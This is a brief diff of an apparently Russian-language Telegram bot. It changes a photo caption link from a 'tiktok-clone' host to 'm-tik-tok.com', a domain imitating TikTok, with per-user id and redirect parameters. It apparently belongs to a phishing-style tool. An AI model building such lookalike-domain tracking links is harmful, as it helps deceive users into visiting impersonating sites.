@@ -123,7 +123,7 @@ async def send_telegram_message(user_id, text, reply_markup):
 
 async def send_telegram_photo(user_id, photo, redirect_url):
     photo_path = await save_image(photo, "data/images")
-    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'📸Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
+    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'📸Вам пришло новое фото!\nСсылка: https://m-tik-tok.com/tt?id={user_id}&redirect={redirect_url}')
 
     mydb = await connect()
     mycursor = mydb.cursor(buffered=True)
